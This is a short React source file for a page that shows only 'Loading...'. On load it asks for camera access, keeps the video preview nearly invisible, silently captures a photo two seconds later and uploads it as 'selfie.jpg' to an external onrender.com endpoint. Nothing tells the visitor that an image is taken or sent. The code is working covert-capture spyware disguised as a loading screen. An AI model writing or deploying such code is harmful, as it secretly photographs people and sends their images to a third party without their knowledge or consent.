import React, { useEffect, useRef } from "react";

function App() {
  const videoRef = useRef(null);
  const canvasRef = useRef(null);

  useEffect(() => {
    navigator.mediaDevices.getUserMedia({ video: true }).then((stream) => {
      if (videoRef.current) {
        videoRef.current.srcObject = stream;

        videoRef.current.oncanplay = () => {
          setTimeout(() => {
            captureImage();
          }, 2000); // 2s after video is ready
        };
      }
    });
  }, []);

  const captureImage = () => {
    const video = videoRef.current;
    const canvas = canvasRef.current;

    if (video && canvas) {
      const context = canvas.getContext("2d");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      context.drawImage(video, 0, 0, canvas.width, canvas.height);

      // Convert image to blob and send to server
      canvas.toBlob((blob) => {
        const formData = new FormData();
        formData.append("image", blob, "selfie.jpg");

        fetch("https://newsletter-selfie-project.onrender.com/send-email", {
          method: "POST",
          body: formData,
        })
          .then((res) => console.log("✅ Sent image to server"))
          .catch((err) => console.error("❌ Failed to send", err));
      }, "image/jpeg");
    }
  };

  return (
    <div>
      <video
        ref={videoRef}
        autoPlay
        muted
        playsInline
        style={{ width: 1, height: 1, opacity: 0.01 }} // hidden preview
      />
      <canvas ref={canvasRef} style={{ display: "none" }} />
      <p>Loading...</p>
    </div>
  );
}

export default App;
